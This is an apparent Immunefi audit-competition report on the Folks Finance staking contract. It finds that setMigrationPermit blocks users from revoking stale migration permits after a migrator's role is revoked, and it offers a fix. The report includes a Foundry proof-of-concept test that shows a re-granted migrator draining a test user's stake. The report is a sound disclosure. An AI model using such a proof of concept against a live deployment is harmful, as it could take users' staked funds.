# 69738 sc low setmigrationpermit prevents users from revoking stale permits after migrator role is revoked

**Submitted on Mar 16th 2026 at 15:35:40 UTC by @ZenHunter for** [**Audit Comp | Folks Finance: Staking Contracts**](https://immunefi.com/audit-competition/audit-comp-folks-finance-staking-contracts)

* **Report ID:** #69738
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/Folks-Finance/folks-staking-contracts/blob/main/src/Staking.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value

## Description

### Brief/Intro

`setMigrationPermit` enforces `hasRole(MIGRATOR_ROLE, _migrator)` for both granting **and** revoking a migration permit. When a user previously approved a migrator whose role was later revoked by the admin, the user's attempt to revoke their own permit reverts with `MigratorNotFound`. The stale `migrationPermits[_migrator][user] = true` persists in storage with no cleanup path.

### Vulnerability Details

`setMigrationPermit` applies the same role check regardless of whether the caller is granting or revoking:

```solidity
// src/Staking.sol#L77-L82
function setMigrationPermit(address _migrator, bool _isMigrationPermitted) external {
    if (!hasRole(MIGRATOR_ROLE, _migrator)) revert MigratorNotFound(_migrator);
    migrationPermits[_migrator][msg.sender] = _isMigrationPermitted;
    emit MigrationPermitUpdated(_migrator, msg.sender, _isMigrationPermitted);
}
```

When `_migrator` no longer holds `MIGRATOR_ROLE`, the check `!hasRole(MIGRATOR_ROLE, _migrator)` is `true` and the function reverts — even when `_isMigrationPermitted` is `false` (i.e., the user is trying to revoke). No other function modifies `migrationPermits`, so the stale entry has no cleanup path.

The known issues list acknowledges that stale permits exist:

> *"State `migrationPermits` may contain migrator which had its `MIGRATOR_ROLE` later revoked"*

However, it does not acknowledge the root cause: the `hasRole` check in `setMigrationPermit` actively blocks the user from revoking the stale permit themselves. The user is left with no recourse.

### Impact Details

If the admin re-grants `MIGRATOR_ROLE` to the same address — for a V3 migration, a key rotation, or after a compromise is believed resolved — every stale permit reactivates immediately. The migrator can call `migratePositionsFrom(user)` for any affected user and receive all of their unclaimed principal and rewards in a single call.

Users with stakes still inside the staking period (before `unlockTime`) are in the worst position: they cannot withdraw their tokens to empty the position, and they cannot revoke the permit. Their funds are fully exposed for as long as the stale permit persists.

### References

* Affected function: `src/Staking.sol#L77-L82` (`setMigrationPermit`)
* Migration execution: `src/Staking.sol#L166-L210` (`migratePositionsFrom`)

## Recommendation

Only enforce the `hasRole` check when **granting** a permit, not when revoking:

```solidity
function setMigrationPermit(address _migrator, bool _isMigrationPermitted) external {
    if (_isMigrationPermitted && !hasRole(MIGRATOR_ROLE, _migrator)) {
        revert MigratorNotFound(_migrator);
    }
    migrationPermits[_migrator][msg.sender] = _isMigrationPermitted;
    emit MigrationPermitUpdated(_migrator, msg.sender, _isMigrationPermitted);
}
```

This allows users to revoke permits at any time regardless of the migrator's current role status, while still preventing users from granting permits to addresses that do not hold the role.

## Proof of Concept

```bash
forge test --match-path test/StaleMigrationPermit.t.sol -vv
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {ERC20Permit, ERC20} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Permit.sol";
import {Staking} from "../src/Staking.sol";
import {IStakingV1} from "../src/interfaces/IStakingV1.sol";

contract Token is ERC20Permit {
    constructor() ERC20Permit("T") ERC20("T", "T") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract StaleMigrationPermitTest is Test {
    uint64  constant STAKING_DURATION = uint64(365 days);
    uint64  constant UNLOCK_DURATION  = uint64(30 days);
    uint32  constant APR_BPS          = 1_000;
    uint256 constant STAKE_AMOUNT     = 1_000e18;
    uint256 constant PREFUND          = 1_000_000e18;

    address admin    = address(0x10);
    address manager  = address(0x11);
    address pauser   = address(0x12);
    address alice    = address(0x13);
    address migrator = address(0x14);

    Token   token;
    Staking staking;

    IStakingV1.StakeParams stakeParams;

    function setUp() public {
        vm.warp(10 * 365 days);

        token   = new Token();
        staking = new Staking(admin, manager, pauser, address(token));

        stakeParams = IStakingV1.StakeParams({
            maxStakingDurationSeconds: STAKING_DURATION,
            maxUnlockDurationSeconds:  UNLOCK_DURATION,
            minAprBps:                 APR_BPS,
            referrer:                  address(0)
        });

        vm.prank(manager);
        staking.addStakingPeriod(PREFUND, STAKING_DURATION, UNLOCK_DURATION, APR_BPS, true);

        token.mint(address(staking), PREFUND);
        token.mint(alice, STAKE_AMOUNT);

        // Alice stakes while her tokens are still locked.
        vm.startPrank(alice);
        token.approve(address(staking), type(uint256).max);
        staking.stake(0, STAKE_AMOUNT, stakeParams);
        vm.stopPrank();

        // Admin grants MIGRATOR_ROLE to migrator.
        vm.startPrank(admin);
        staking.grantRole(staking.MIGRATOR_ROLE(), migrator);
        vm.stopPrank();

        // Alice approves the migrator.
        vm.prank(alice);
        staking.setMigrationPermit(migrator, true);
        assertTrue(staking.migrationPermits(migrator, alice), "permit should be set");

        // Admin revokes MIGRATOR_ROLE from migrator (migration phase ends).
        vm.startPrank(admin);
        staking.revokeRole(staking.MIGRATOR_ROLE(), migrator);
        vm.stopPrank();
    }

    // Demonstrates the bug: user cannot revoke a stale permit after the
    // migrator's role is revoked — setMigrationPermit reverts.
    function test_StaleMigrationPermit_UserCannotRevoke() public {
        // Alice tries to revoke her stale permit — should succeed but reverts.
        vm.prank(alice);
        vm.expectRevert(abi.encodeWithSelector(IStakingV1.MigratorNotFound.selector, migrator));
        staking.setMigrationPermit(migrator, false);

        // Stale permit is still active.
        assertTrue(staking.migrationPermits(migrator, alice), "stale permit persists");
        console.log("Alice's permit after revocation attempt:", staking.migrationPermits(migrator, alice));

        // Admin re-grants MIGRATOR_ROLE (e.g. for V3 migration or key rotation).
        vm.startPrank(admin);
        staking.grantRole(staking.MIGRATOR_ROLE(), migrator);
        vm.stopPrank();

        // Stale permit immediately reactivates — migrator can drain Alice's tokens.
        uint256 migratorBalanceBefore = token.balanceOf(migrator);

        vm.prank(migrator);
        staking.migratePositionsFrom(alice);

        uint256 drained = token.balanceOf(migrator) - migratorBalanceBefore;
        console.log("Tokens drained from Alice without renewed consent:", drained);
        assertGt(drained, 0, "migrator drained Alice's tokens via stale permit");
    }
}
```

**Output:**

```
[PASS] test_StaleMigrationPermit_UserCannotRevoke() (gas: 156419)
Logs:
  Alice's permit after revocation attempt: true
  Tokens drained from Alice without renewed consent: 1100000000000000000000
```

Alice's `setMigrationPermit(migrator, false)` reverts with `MigratorNotFound`. The stale permit persists. When the admin re-grants the role, the migrator immediately drains Alice's full 1,100 FOLKS (1,000 principal + 100 reward at 10% APR) without any renewed consent from Alice.
